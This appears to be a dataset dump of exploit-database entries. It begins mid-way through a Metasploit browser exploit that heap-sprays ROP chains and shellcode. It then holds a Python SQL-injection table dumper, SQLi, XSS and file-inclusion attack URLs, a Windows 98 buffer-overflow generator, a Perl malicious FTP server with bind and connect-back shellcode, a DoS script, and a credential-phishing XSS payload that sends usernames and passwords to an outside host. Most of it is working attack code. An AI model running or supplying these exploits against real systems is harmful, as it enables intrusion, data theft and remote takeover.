(var i = 0; i < blocklen-1; i=i+4)       {         unescapestr += ""%u"" + block.substring(i,i+4);       }       return unescapestr;     }      var heap_obj = new heapLib.ie(0x10000);     var code = unescape(""#{js_code}"");     var nops = unescape(""#{js_random_nops}"");      function heap_spray(jutil_base) {       while (nops.length < 0x80000) nops += nops;       var offset_length = #{t['Offset']};       for (var i=0; i < 0x1000; i++) {         var padding = unescape(tounescape(randomblock(0x1000)));         while (padding.length < 0x1000) padding+= padding;         var junk_offset = padding.substring(0, offset_length);         var rop = tab2uni(rop_chain(jutil_base));         var single_sprayblock = junk_offset + rop + code + nops.substring(0, 0x800 - rop.length -  code.length - junk_offset.length);         while (single_sprayblock.length < 0x20000) single_sprayblock += single_sprayblock;         sprayblock = single_sprayblock.substring(0, (0x40000-6)/2);         heap_obj.alloc(sprayblock);       }     }     |     return js   end    def ie8_spray(t, p)     js_nops = Rex::Text.to_unescape(""\x0c""*4, Rex::Arch.endian(t.arch))     js_code = Rex::Text.to_unescape(p, Rex::Arch.endian(t.arch))      js = %Q|     var heap_obj = new heapLib.ie(0x20000);     var code = unescape(""#{js_code}"");     var nops = unescape(""#{js_nops}"");      function rop_chain(jutil_base){       var arr = [         Number(Math.floor(Math.random()*0xffffffff)),         Number(0x0c0c0c0c),         Number(0x0c0c0c0c),         Number(0x0c0c0c1c),         Number(0x0c0c0c24),         Number(0x0c0c0c28),         Number(Math.floor(Math.random()*0xffffffff)),         Number(Math.floor(Math.random()*0xffffffff)),         Number(0x0c0c0c0c),         Number(0x0c0c0c3c),         jutil_base + Number(0x00212f17),         jutil_base + Number(0x000a5843),         Number(0x0c0c0c34),         jutil_base + Number(0x5de121),         jutil_base + Number(0x20ca),         jutil_base + Number(0x4bebeb),         jutil_base + Number(0x4c03d2),         jutil_base + Number(0x1be314),         jutil_base + Number(0xac8e8),         jutil_base + Number(0xe1859),         Number(0x00000201),         jutil_base + Number(0x219cf9),         Number(0x00000040),         jutil_base + Number(0x182e50),         jutil_base + Number(0x4f5217),         jutil_base + Number(0xe2fd1),         jutil_base + Number(0x1339db),         jutil_base + Number(0x202439),         Number(0x90909090),         jutil_base + Number(0x4fcfe3)       ];       return arr;     }      function d2u(dword){       var uni = String.fromCharCode(dword & 0xFFFF);       uni += String.fromCharCode(dword>>16);       return uni;     }      function tab2uni(tab){       var uni = """"       for(var i=0;i<tab.length;i++){         uni += d2u(tab[i]);       }       return uni;     }      function heap_spray(jutil_base) {       while (nops.length < 0x80000) nops += nops;       var offset = nops.substring(0, #{t['Offset']});       var rop = tab2uni(rop_chain(jutil_base));       var shellcode = offset + rop + code + nops.substring(0, 0x800-rop.length-code.length-offset.length);       while (shellcode.length < 0x40000) shellcode += shellcode;       var block = shellcode.substring(0, (0x80000-6)/2);       heap_obj.gc();       for (var i=1; i < 0x300; i++) {         heap_obj.alloc(block);       }     }     |     return js   end    def ie6_spray(t, p)     js_nops = Rex::Text.to_unescape(""\x0c""*4, Rex::Arch.endian(t.arch))     js_code = Rex::Text.to_unescape(p, Rex::Arch.endian(t.arch))      js = %Q|     var heap_obj = new heapLib.ie(0x20000);     var nops = unescape(""#{js_nops}"");     var code = unescape(""#{js_code}"");      function heap_spray() {       while (nops.length < 0x80000) nops += nops;       var offset = nops.substring(0, #{t['Offset']});       var shellcode = offset + code + nops.substring(0, 0x800-code.length-offset.length);       while (shellcode.length < 0x40000) shellcode += shellcode;       var block = shellcode.substring(0, (0x80000-6)/2);       heap_obj.gc();       for (var i=1; i < 0x300; i++) {         heap_obj.alloc(block);       }     }     |     return js   end    def ie_heap_spray(my_target, p)     # Land the payload at 0x0c0c0c0c     case my_target     when targets[7]       # IE 9 on Windows 7       js = ie9_spray(my_target, p)     when targets[5], targets[6]       # IE 8 on Windows 7 and Windows Vista       js = ie8_spray(my_target, p)     else       js = ie6_spray(my_target, p)     end      js = heaplib(js, {:noobfu => true})      if datastore['OBFUSCATE']       js = ::Rex::Exploitation::JSObfu.new(js)       js.obfuscate       @heap_spray_fn = js.sym(""heap_spray"")     else       @heap_spray_fn = ""heap_spray""     end      return js   end    def get_windows_xp_payload     fake_memory = [         junk,       # junk         # 0c0c0c0c         0x0c0c0c0c, # Dereference  # 0c0c0c10         0x0c0c0c0c, # Dereference  # 0c0c0c14         0x0c0c0c1c, # [0x0c0c0c0c] # 0c0c0c18         0x0c0c0c24, # Dereference  # 0c0c0c1c         0x0c0c0c28, # Dereference  # 0c0c0c20         junk,       # junk         # 0c0c0c24         junk,       # junk         # 0c0c0c28         0x0c0c0c0c, # Dereference  # 0c0c0c2c         0x0c0c0c30, # Dereference  # 0c0c0c30         0x0c0c0c38, # new eip      # 0c0c0c34     ].pack(""V*"")      p = fake_memory + payload.encoded      return p   end    def get_windows_msvcrt_payload     fake_memory = [         junk,       # junk         # 0c0c0c0c         0x0c0c0c0c, # Dereference  # 0c0c0c10         0x0c0c0c0c, # Dereference  # 0c0c0c14         0x0c0c0c1c, # [0x0c0c0c0c] # 0c0c0c18         0x0c0c0c24, # Dereference  # 0c0c0c1c         0x0c0c0c28, # Dereference  # 0c0c0c20         junk,       # junk         # 0c0c0c24         junk,       # junk         # 0c0c0c28         0x0c0c0c0c, # Dereference  # 0c0c0c2c         0x0c0c0c3c, # Dereference  # 0c0c0c30         0x77c21ef4, # ppr msvcrt   # 0c0c0c34         0x77c15ed5, # xchg eax,esp # ret (msvcrt)         0x0c0c0c34  # eax value    # 0c0c0c3c     ].pack(""V*"")      return generate_rop_payload('msvcrt', payload.encoded, {'pivot'=> fake_memory, 'target'=>'xp'})   end    def get_payload(t)      # Both ROP chains generated by mona.py - See corelan.be     case t['Rop']     when :msvcrt       print_status(""Using msvcrt ROP"")       p = get_windows_msvcrt_payload     when :jutil       print_status(""Using JUtil ROP built dynamically..."")       p = payload.encoded     else       print_status(""Using payload without ROP..."")       p = get_windows_xp_payload     end      return p   end    def info_leak_trigger     js = <<-EOS     <object classid='clsid:5D6A72E6-C12F-4C72-ABF3-32F6B70EBB0D' id='obj' />     </object>     <script language='javascript'>     jutil_address = obj.NumChildren(0x10017018 - 0x0c);     jutil_base = jutil_address - 0x49440;     #{@heap_spray_fn}(jutil_base);     obj.DeleteItem(0x0c0c0c08);     </script>     EOS      return js   end    def exec_trigger     js = <<-EOS     <object classid='clsid:5D6A72E6-C12F-4C72-ABF3-32F6B70EBB0D' id='obj' />     </object>     <script language='javascript'>     #{@heap_spray_fn}();     obj.DeleteItem(0x0c0c0c08);     </script>     EOS      return js   end    def get_trigger(t)     case t['Rop']       when :jutil         js = info_leak_trigger       else         js = exec_trigger     end      return js   end    def load_exploit_html(my_target)     p  = get_payload(my_target)     js = ie_heap_spray(my_target, p)     trigger = get_trigger(my_target)      html = %Q|     <html>     <head>     <script language='javascript'>     #{js}     </script>     </head>     <body>     #{trigger}     </body>     </html>     |      return html   end    def on_request_uri(cli, request)     agent = request.headers['User-Agent']     uri   = request.uri     print_status(""Requesting: #{uri}"")      my_target = get_target(agent)     # Avoid the attack if no suitable target found     if my_target.nil?       print_error(""Browser not supported, sending 404: #{agent}"")       send_not_found(cli)       return     end      html = load_exploit_html(my_target)     html = html.gsub(/^\t\t/, '')     print_status(""Sending HTML..."")     send_response(cli, html, {'Content-Type'=>'text/html'})   end  end",SIEMENS,1
8443,"Job2C 4.2 - 'adtype' Local File Inclusion [~] Job2C version 4.2 (adtype) MulTiple LFi [~] [~] Script: http://www.w2b.ru/download/Job2C.zip [~] ---------------------------------------------------------- [~] Discovered By: ZoRLu [~] [~] Date: 15.04.2009 [~] [~] Home: yildirimordulari.com / dafgamers.com / z0rlu.blogspot.com  [~] [~] contact: trt-turk@hotmail.com [~] [~] N0T: Herkes Hecker Olmus :S yav siktirin gidin mal mal gelip msn de konusmayIn :S Herkes Ustune AlInmasIn anlayan anladI :S [~] [~] N0T: if you wanna learn hack you must be register to my site yildirimordulari.com [~] -----------------------------------------------------------  file:   windetail.php  err0r c0de:  $adtype=$_REQUEST[""adtype""]; $id=$_REQUEST[""id""];                 ( err0r c0de 1 ) $title=$_REQUEST[""title""];  	winHead($title); 	include(""lib/"".$adtype."".inc"");    ( err0r c0de 2 ) 	 exp 1: 	 yildirimordulari.com/script/windetail.php?adtype=LFÃ%00  file:  detail.php  err0r c0de:  $mode=$_REQUEST[""mode""]; $adtype=$_REQUEST[""adtype""];         ( err0r c0de 1 ) $id=$_REQUEST[""id""]; $auth=$_SESSION[""auth""]; include(""conf/conf.inc""); include(""lib/lib.inc""); include(""lib/addlib.inc""); include(""templates/header.inc""); if(!$adtype)$adtype=""res"";  	include(""lib/"".$adtype."".inc"");    ( err0r c0de 1 )	 	  exp 2:  yildirimordulari.com/script/detail.php?adtype=LFÃ%00   [~] ---------------------------------------------------------------------- [~] Greetz tO: str0ke & DrLy0N & w0cker & Cyber-Zone & stack [~] [~] yildirimordulari.com / dafgamers.com / z0rlu.blogspot.com [~] [~] ----------------------------------------------------------------------  # milw0rm.com [2009-04-15]",.w2b.,0
48432,"YesWiki cercopitheque 2020.04.18.1 - 'id' SQL Injection # Exploit Title: YesWiki cercopitheque 2020.04.18.1 - 'id' SQL Injection # Date: 2020-04-25 # Exploit Author: coiffeur # Vendor Homepage: https://yeswiki.net/ # Software Link: https://yeswiki.net/, https://github.com/YesWiki/yeswiki # Version: YesWiki cercopitheque < 2020-04-18-1  import sys  import requests  DEBUG = 0   def usage():     banner = """"""NAME: YesWiki cercopitheque 2020-04-18-1, SQLi SYNOPSIS: python sqli_2020.04.18.1.py <URL> [OPTIONS]... DESCRIPTION:     -lt, list tables.     -dt <TABLE>, dump table. AUTHOR: coiffeur     """"""     print(banner)   def parse(text):     deli_l = 'ABCAABBCC|'     deli_r = '|ABCAABBCC'     if (text.find(deli_l) == -1) or (text.find(deli_r) == -1):         print('[x] Delimiter not found, please try to switch to a Time Based SQLi')         exit(-1)     start = text.find(deli_l) + len(deli_l)     end = start + text[start::].find(deli_r)     return text[start:end]   def render(elements):     print(elements)  def get_count(t_type, table_name=None, column_name=None):     if t_type == 'table':         payload = '?BazaR&vue=consulter&id=-9475 UNION ALL SELECT (SELECT concat(0x414243414142424343,0x7c,count(TABLE_NAME),0x7c,0x414243414142424343) FROM information_schema.tables),NULL,NULL,NULL,NULL,NULL-- -'         if DEBUG > 1:             print(f'[DEBUG] {payload}')         r = requests.get(url=f'{sys.argv[1]}{payload}')         if r.status_code == 200:             data = parse(r.text)     if t_type == 'column':         payload = f'?BazaR&vue=consulter&id=-9475 UNION ALL SELECT (SELECT concat(0x414243414142424343,0x7c,count(COLUMN_NAME),0x7c,0x414243414142424343) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = ""{table_name}""),NULL,NULL,NULL,NULL,NULL-- -'         if DEBUG > 1:             print(f'[DEBUG] {payload}')         r = requests.get(url=f'{sys.argv[1]}{payload}')         data = parse(r.text)     if t_type == 'element':         payload = f'?BazaR&vue=consulter&id=-9475 UNION ALL SELECT (SELECT concat(0x414243414142424343,0x7c,count({column_name}),0x7c,0x414243414142424343) FROM {table_name}),NULL,NULL,NULL,NULL,NULL-- -'         if DEBUG > 1:             print(f'[DEBUG] {payload}')         r = requests.get(url=f'{sys.argv[1]}{payload}')         data = parse(r.text)     return int(data)   def list_tables():     tables_count = get_count(t_type='table')     print(f'[+] Tables found: {tables_count}')      tables = []     for i in range(0, tables_count):         payload = f'?BazaR&vue=consulter&id=-9475 UNION ALL SELECT (SELECT concat(0x414243414142424343,0x7c,TABLE_NAME,0x7c,0x414243414142424343) FROM information_schema.tables LIMIT 1 OFFSET {i}),NULL,NULL,NULL,NULL,NULL-- -'         if DEBUG > 1:             print(f'[DEBUG] {payload}')         r = requests.get(url=f'{sys.argv[1]}{payload}')         if r.status_code == 200:             talbe = parse(r.text)             print(f'\t{talbe}')             tables.append(talbe)     return tables   def list_columns(table_name):     columns_count = get_count(t_type='column', table_name=table_name)     print(f'[+] Columns found: {columns_count}')      columns = []     for i in range(0, columns_count):         payload = f'?BazaR&vue=consulter&id=-9475 UNION ALL SELECT (SELECT concat(0x414243414142424343,0x7c,COLUMN_NAME,0x7c,0x414243414142424343) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = ""{table_name}"" LIMIT 1 OFFSET {i}),NULL,NULL,NULL,NULL,NULL-- -'         if DEBUG > 1:             print(f'[DEBUG] {payload}')         r = requests.get(url=f'{sys.argv[1]}{payload}')         if r.status_code == 200:             column = parse(r.text)             if DEBUG > 0:                 print(f'\t{column}')             columns.append(column)     return columns   def dump_table(name):     columns = list_columns(name)     elements = [None]*len(columns)     for i in range(0, len(columns)):         elements_count = get_count(             t_type='element', table_name=name, column_name=columns[i])         if DEBUG > 0:             print(f'[+] Dumping: {columns[i]} ({elements_count} rows)')         element = []         for j in range(0, elements_count):             payload = f'?BazaR&vue=consulter&id=-9475 UNION ALL SELECT (SELECT concat(0x414243414142424343,0x7c,{columns[i]},0x7c,0x414243414142424343) FROM {name} LIMIT 1 OFFSET {j}),NULL,NULL,NULL,NULL,NULL-- -'             if DEBUG > 1:                 print(f'[DEBUG] {payload}')             r = requests.get(url=f'{sys.argv[1]}{payload}')             if r.status_code == 200:                 element.append(parse(r.text))                 if DEBUG > 0:                     print(f'\t{element[-1]}')         elements[i] = element     render(elements)     return elements   def main():     if len(sys.argv) < 3:         print(usage())         exit(-1)      if sys.argv[2] == '-lt':         list_tables()      if sys.argv[2] == '-dt':         dump_table(sys.argv[3])   if __name__ == ""__main__"":     main()",YesWiki,1
31215,"Joomla! / Mambo Component Filebase - 'filecatid' SQL Injection source: https://www.securityfocus.com/bid/27829/info  The Joomla! and Mambo 'com_filebase' component is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.  Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.   http://www.example.com/index.php?option=com_filebase&Itemid=S@BUN&func=selectfolder&filecatid=-1/**/union/**/select/**/concat(username,0x3a,password),concat(username,0x3a,password),concat(u sername,0x3a,password)/**/from/**/mos_users/*",Mambo,1
30804,VBTube 1.1 - Search Cross-Site Scripting source: https://www.securityfocus.com/bid/26566/info  VBTube is prone to a cross-site scripting vulnerability because it fails to sufficiently sanitize user-supplied data.  Exploiting this issue allows attackers to execute arbitrary HTML or script code in a user's browser session in the context of an affected site. This may allow the attacker to steal cookie-based authentication credentials and launch other attacks.  This issue affects VBTube 1.1; other versions may also be vulnerable.   http://www.example.com/vBTube.php?do=search&search=<script>alert(document.cookie)</script>,VBTube,1
30729,"Blue Coat ProxySG Management Console - URI Handler Multiple Cross-Site Scripting Vulnerabilities source: https://www.securityfocus.com/bid/26286/info  Blue Coat ProxySG Management Console is prone to two cross-site scripting vulnerabilities because the application fails to properly sanitize user-supplied input.  An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.  Versions prior to ProxySG 4.2.6.1 and 5.2.2.5 are vulnerable.  NOTE: This BID originally covered one issue, but was updated to also cover a second issue.   https://www.example.com:8082/Secure/Local/console/install_upload_action/crl_format?name=""<script>alert(""XSS"")</script>%00 https://www.example.com:8082/Secure/Local/console/install_upload_from_file.htm?file=<script>alert(""XSS"")</script><!-- Example Payload: <script> do { a=prompt(""Blue Coat SG400: an error has occurred\nPlease enter your USERNAME"",""""); b=prompt(""Blue Coat SG400: an error has occurred\nPlease enter your PASSWORD"",""""); }while(a==null || b==null || a=="""" || b==""""); alert(""owned!:""+a+""/""+b);window.location=""http://www.example2.com/?u=""+a+""&p=""+b </script><!--",Blue,0
20568,"Skunkware 2.0 - view-source Directory Traversal source: https://www.securityfocus.com/bid/2251/info  view-source is a script included with the httpd package bundled with Skunkware 2.0. Skunkware 2.0 is a variant of the UNIX Operating System distributed by Santa Cruz Operations.  A problem with the view-source script could allow access to restricted files remotely. The problem occurs in the handling of slashes and dots when appended to the view-source script. By appending a series of double-dots and slashes to a query using the view-source script, it is possible to traverse the directory structure on a web server. By doing so, it is possible for to view the contents of directories, and files that are readable by the UID of the httpd process. This flaw makes it possible for a user with malicious motives to read files on a remote system and gather intelligence for an attack against the system, as well as other potentially sensitive information.   http://vulnerable.server/cgi-bin/view-source?../../../../../../../etc/passwd",Skunkware,0
18665,"PHP 5.4.0 Built-in Web Server - Denial of Service (PoC) #!/usr/bin/python  # Title:      PHP 5.4.0 Built-in Web Server DoS PoC # Date:       16 March 2012 # Author:     ls (contact@kaankivilcim.com) # Reference:  https://bugs.php.net/bug.php?id=61461 # Comments:   Fixed in PHP 5.4.1RC1-DEV and 5.5.0-DEV  # The value of the Content-Length header is passed directly to a pemalloc() call in sapi/cli/php_cli_server.c # on line 1538. The inline function defined within Zend/zend_alloc.h for malloc() will fail, and will terminate # the process with the error message ""Out of memory"". # # 1537 if (!client->request.content) { # 1538   client->request.content = pemalloc(parser->content_length, 1); # 1539   client->request.content_len = 0; # 1540 } # # PHP 5.4.0 Development Server started at Tue Mar 13 19:41:45 2012 # Listening on 127.0.0.1:80 # Document root is /tmp # Press Ctrl-C to quit. # Out of memory  import socket, sys  target = ""127.0.0.1"" port   = 80;  request  = ""POST / HTTP/1.1\n"" request += ""Content-Type: application/x-www-form-urlencoded\n"" request += ""Content-Length: 2147483638\n\n"" # <-- Choose size larger than the available memory on target request += ""A=B\n\n""  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  try:   s.connect((target, port)) except:   print ""[-] Connection to %s:%s failed!"" % (target, port)   sys.exit(0)  print ""[+] Sending HTTP request. Check for crash on target.""  s.send(request) s.close()",Built-in,0
33987,PHP Banner Exchange 1.2 - 'signupconfirm.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/40165/info  PHP Banner Exchange is prone to a cross-site scripting vulnerability because the application fails to sufficiently sanitize user-supplied input.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.  PHP Banner Exchange 1.2 is vulnerable; other versions may also be affected.   http://www.example.com/signupconfirm.php?name=indoushkax&login=hacked&pass=exploit&email=indoushka%40hotmail%2E.com&url=http%3A%2F%2F&bannerurl=<script>alert(213771818860)</script>&submit=%C7%D6%DB%D8%20%E3%D1%C9%20%E6%C7%CD%CF%C9%20%E1%E1%C7%D4%CA%D1%C7%DF,phpbannerexchange_project,1
24209,"Sygate Personal Firewall Pro 5.5 - Local Denial of Service source: https://www.securityfocus.com/bid/10542/info  A local denial of service vulnerability is reported to affect the Sygate Personal Firewall. It is reported that the smc.exe service may be crashed using the List-View Control in the Sygate Personal Firewall GUI.  This issue may be exploited in conjunction with the issue described in BID 10540, in order to completely disable the affected firewall as an unprivileged user.   This vulnerability is reported to affect Sygate Personal Firewall PRO version 5.5 Build 2525. Other versions might also be affected.  SendMessage(hHdrControl, HDM_GETITEMRECT, 1, (LPARAM)NON-WRITABLE_ADDR);",Sygate,1
29408,Magic Photo Storage Website - '/admin/add_welcome_text.php?_config[site_path]' Remote File Inclusion source: https://www.securityfocus.com/bid/21965/info   Magic Photo Storage Website is prone to multiple remote file-include vulnerabilities because it fails to sufficiently sanitize user-supplied data.   Exploiting these issues may allow an attacker to compromise the application and the underlying system; other attacks are also possible.  http://www.example.com/path/admin/add_welcome_text.php?_config[site_path]=http://www.example2.com,Magic,1
19608,"Microsoft Windows 95/98 - UNC Buffer Overflow (2) // source: https://www.securityfocus.com/bid/779/info   There is a overflowable buffer in the networking code for Windows 95 and 98 (all versions). The buffer is in the part of the code that handles filenames. By specifying an exceptionally long filename, an attacker can cause the machine to crash or execute arbitrary code. This vulnerability could be exploited remotely by including a hostile UNC or file:// URL in a web page or HTML email. The attack would occur when the page was loaded in a browser or the email was opened (including opening the email in a preview pane.)   /*=========================================================================    Microsoft IE5 for Windows98 exploit    The Shadow Penguin Security (http://shadowpenguin.backsection.net)    Written by UNYUN (shadowpenguin@backsection.net)   ========================================================================= */  #include    <stdio.h> #include    <windows.h>  #define     MAXBUF          1000 #define     RETADR          53  /*     jmp esp (FF E4) code is stored in this area.     You must change this address for non-Japanese Windows98 */ #define     EIP             0xbfb75a35                                            unsigned char   exploit_code[200]={ 0x43,0x43,0x43,0x43,0x43,0x53,0x53,0x53, 0xB8,0x2D,0x23,0xF5,0xBF,0x48,0x50,0xC3, 0x00 };  main(int argc,char *argv[]) {     FILE                    *fp;     unsigned int            ip;     unsigned char           buf[MAXBUF];      if (argc<2){         printf(""usage %s output_htmlfile\n"",argv[0]);         exit(1);     }     if ((fp=fopen(argv[1],""wb""))==NULL) return FALSE;        fprintf(fp,""<META HTTP-EQUIV=\""Refresh\"" CONTENT=\""0;URL=file://test/"");          memset(buf,0x41,MAXBUF);     ip=EIP;     buf[RETADR-1]=0x7f;     buf[RETADR  ]=ip&0xff;     buf[RETADR+1]=(ip>>8)&0xff;     buf[RETADR+2]=(ip>>16)&0xff;     buf[RETADR+3]=( ip>>24)&0xff;     memcpy(buf+80,exploit_code,strlen(exploit_code));     buf[MAXBUF]=0;     fprintf(fp,""%s/\"">\n<HTML><B>"",buf);     fprintf(fp,""10 seconds later, this machine will be shut down.</B><BR><BR>"");     fprintf(fp,""If you are using IE5 for Japanese Windows98, "");     fprintf(fp,""maybe, the exploit code which shuts down your machine will be executed.<BR>"");     fprintf(fp,""</HTML>\n"");     fclose(fp);     printf(""%s created.\n"",argv[1]);     return FALSE; }",Microsoft,1
22891,"IglooFTP 0.6.1 - Banner Parsing Buffer Overflow source: https://www.securityfocus.com/bid/8161/info  A buffer overflow vulnerability has been reported in IglooFTP. The vulnerability occurs when IglooFTP is parsing 'Welcome' banner messages from remote FTP servers. When IglooFTP receives an FTP banner exceeding a certain length, it will trigger the overflow condition. This could allow for execution of malicious code in the context of the FTP client.  #!/usr/bin/perl  # PoC exploit for iglooftp, cftp and moxftp for freebsd  # moxftp / mftp 2.2 # cftp 0.12 # Iglooftp 0.6.1  # Some of the code is fucked, the passive connection is a cheap hack and will not # respawn, so the fake ftpd will have to be restarted... (only IglooFTP) # Some RET adr's change, this can be fixed with gdb, look into it yourself..  # all the clients are from ports.. some may have been fixed, did this shit some  # time ago..  # thanks to kokanin for help and advice # code by inv[at]dtors  use IO::Socket;  sub convert_ret { my($ret) = @_;          for ($x=8; $x>0; $x=$x-2){ 	$ret = substr($ret_temp,$x,2); 	$new_ret .= chr hex ""$ret"";     } return $new_ret; }  sub convert_ip { my($ip) = @_;  @ip_tmp = split(/\./, $ip);  for($x=0; $x<4; $x++) {     $new_ip .= chr @ip_tmp[$x]; } return $new_ip; }  $server_port = 21; $passive_server_port = 10324;  unless(@ARGV == 3 || @ARGV == 2)  { die  ""Usage ./DSR-ftp_clients.pl Shellcode Client Ip\n \tShellcode:\t0 = Portbind \t\t\t1 = Connect back\n \tClient:\t\t0 = IglooFTP (FreeBSD 4.7) \t\t\t1 = cftp (FreeBSD 4.7) \t\t\t2 = Moxftp (FreeBSD 4.7) \t\t\t3 = cftp (FreeBSD 5.0) \t\t\t4 = IglooFTP (FreeBSD 5.0) \t\t\t5 = Moxftp (FreeBSD 5.0)\n"" }  ($shellcode_arg, $client_arg, $extra_arg) = @ARGV;  $user_ip = convert_ip($extra_arg);  @shellcode_list = (     ""Portbind,\x31\xc9\xf7\xe1\x51\x41\x51\x41\x51\x51\xb0\x61\xcd\x80\x89\xc3\x52\x66\x68\x27\x10\x66\x51\x89\xe6\xb1\x10\x51\x56\x50\x50\xb0\x68\xcd\x80\x51\x53\x53\xb0\x6a\xcd\x80\x52\x52\x53\x53\xb0\x1e\xcd\x80\xb1\x03\x89\xc3\xb0\x5a\x49\x51\x53\x53\xcd\x80\x41\xe2\xf5\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x54\x53\x53\xb0\x3b\xcd\x80"",     ""Connect Back,\x31\xc9\xf7\xe1\x51\x41\x51\x41\x51\x51\xb0\x61\xcd\x80\x89\xc3\x68"".""$user_ip"".""\x66\x68\x27\x10\x66\x51\x89\xe6\xb2\x10\x52\x56\x50\x50\xb0\x62\xcd\x80\x41\xb0\x5a\x49\x51\x53\x53\xcd\x80\x41\xe2\xf5\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x54\x53\x53\xb0\x3b\xcd\x80"");  @client_list = (     ""IglooFTP - FreeBSD 4.7,188,0xbfbfc560,0"",     ""cftp - FreeBSD 4.7,8192,0xbfbffb04,1,300"",     ""mftp - FreeBSD 4.7,516,0xbfbff8e0,1,100"",     ""cftp - FreeBSD 5.0,8196,0xbfbffa30,1,300"",     ""IglooFTP - FreeBSD 5.0,212,0xbfbfc440,0"",     ""mftp - FreeBSD 5.0,532,0xbfbff950,1,100"");  @client_info = split(/,/,@client_list[$client_arg]); @shellcode_info = split(/,/,@shellcode_list[$shellcode_arg]);  print ""\tDSR-ftp_clients by inv\n Setting up Service on Port: $server_port Client: @client_info[0] Using Shellcode: @shellcode_info[0] Using Offset: @client_info[2]\n"";  $shellcode = @shellcode_info[1]; $shellcode_length = length($shellcode);  $nop_count = @client_info[1] - $shellcode_length - 8; $nops = ""\x90""x$nop_count;  $ret_temp = @client_info[2]; $ret = substr($ret_temp,2,8); $ret = convert_ret($ret); $ret = ""$ret""x2;  if(@client_info[3] eq ""1"") {     $nops_x = ""\x90""x@client_info[1];     $nops_y = ""\x90""x@client_info[4];     $exploit_string = ""$nops_x"".""$ret"".""$nops_y"".""$shellcode""; }  if($client_arg == 0 or $client_arg == 4) { 	$exploit_string =""total 666 drwxr-xr-x	25 root wheel	1536 Jan 28 00:13 . drwxr-xr-x	14 root wheel	 512 Jan 28 00:13 .. -rwxr-xr-x	 2 inv	inv	 512 Jan 29 01:00 $nops$shellcode$ret""; }  $server = IO::Socket::INET->new(LocalPort => $server_port,                                 Type    => SOCK_STREAM,                                 Reuse   => 1,                                 Listen  => 10) or die ""Can't listen on $server_port : $!\n"";  while ($client = $server->accept()) {          if(@client_info[3] == 1) { 	print $client ""220 $exploit_string\n"";     }          if(@client_info[3] eq ""0"") { 	print $client ""220 0xdeadcode\n""; 	while($request !=~ /QUIT/i) { 	    $request = <$client>; 	    print $request; 	     	    if($request =~ /PASS/i) { 		print $client ""230 User anonymous logged in.\n""; 	    } 	     	    if($request =~ /USER/i) { 		print $client ""331 Password required for anonymous.\n""; 	    } 	 	    if($request =~ /SYST/i) { 		print $client ""215 UNIX Type: L8\n""; 	    } 	 	    if($request =~ /REST/i) { 		print $client ""350 Restarting.\n""; 	    } 	 	    if($request =~ /TYPE/i) { 		    print $client ""200 Type set to A.\n""; 	    } 	     	    if($request =~ /PWD/i or $request =~ /FEAT/i) { 		print $client ""257 \""/usr/home/inv/\"" is current directory.\n""; 	    } 	 	    if($request =~ /PASV/i) { 		$passive_server = IO::Socket::INET->new(LocalPort => $passive_server_port, 					Type 	=> SOCK_STREAM, 					Reuse 	=> 1, 					Listen 	=> 10) 		or die ""Can't open passive port""; 		print $client ""227 Entering Passive Mode (127,0,0,1,40,84)\n""; 	    } 	     	    if ($request =~ /LIST/i) { 		while($passive_client = $passive_server->accept()){ 		    print $client ""150 Starting transfer.\n"";     		    print $passive_client $exploit_string; 		    close $passive_client; 		    print $client ""226 BANG YOU ARE DEAD!!!\n""; 		} 	    }	 	 	}     close $client;     } }",IglooFTP),0
35914,"ferretCMS 1.0.4-alpha - Multiple Vulnerabilities Advisory: Advisory ID: SROEADV-2015-10 Author: Steffen Rösemann Affected Software: ferretCMS v. 1.0.4-alpha Vendor URL: https://github.com/JRogaishio/ferretCMS Vendor Status: vendor will patch eventually CVE-ID: -  Tested on:  - Firefox 35, Iceweasel 31 - Mac OS X 10.10, Kali Linux 1.0.9a  ========================== Vulnerability Description: ==========================  The content management system ferretCMS v.1.0.4, which is currently in alpha development stage, suffers from multiple stored/reflecting XSS- and SQLi-vulnerabilities in its administrative backend. Moreover, there exists the possibility to upload arbitrary files via the administrative backend, which can be executed by unauthenticated users, too.  ================== Technical Details: ==================  A reflecting XSS vulnerability can be found in the parameter ""action"" used in the file admin.php:  http:// {TARGET}/admin.php?type=search&action=%3Cscript%3Ealert%28document.cookie%29%3C/script%3E  Stored XSS vulnerabilities resides in the logging functionality of ferretCMS. On the administrative backend, the administrator has the opportunity to watch events stored in a log. An event, that gets logged, are login-attempts to the administrative backend, where the used username is displayed, too. An attacker can abuse this, by trying to log in with JavaScript-code instead of a username. That code gets executed in the logs.  Login-form is located here: http://{TARGET}/admin.php  XSS gets executed here: http://{TARGET}/admin.php?type=log&action=read  Another stored XSS vulnerability can be found in the pagetitle of a new blog entry that is created by the administrator:  vulnerable form: http://{TARGET}/admin.php?type=page&action=insert&p=  XSS gets executed here: http://{TARGET}/admin.php?type=page&action=read   The following URLs are prone to SQL injection attacks:  http:// {TARGET}/admin.php?type=site&action=update&p=1+and+1=2+union+select+1,version%28%29,3,4+--+  http:// {TARGET}/admin.php?type=customkey&action=update&p=1+and+1=2+union+select+1,version%28%29,database%28%29,4+--+  http:// {TARGET}/admin.php?type=account&action=update&p=1+and+1=2+union+select+1,database%28%29,3,4,5,version%28%29,7,8,9+--+  http:// {TARGET}/admin.php?type=plugin&action=update&p=1+and+1=2+union+select+1,database%28%29,version%28%29,4+--+  http:// {TARGET}/admin.php?type=template&action=update&p=1+and+1=2+union+select+1,version%28%29,database%28%29,user%28%29,5+--+  http:// {TARGET}/admin.php?type=permissiongroup&action=update&p=1+and+1=2+union+select+1,version%28%29,3,4+--+  http:// {TARGET}/admin.php?type=page&action=update&p=1+and+substring%28version%28%29,1,1%29=5+--+  Last but not least there is a file-upload functionality in the administrative backend of ferretCMS. The administrator can upload arbitrary files here via the following URL:  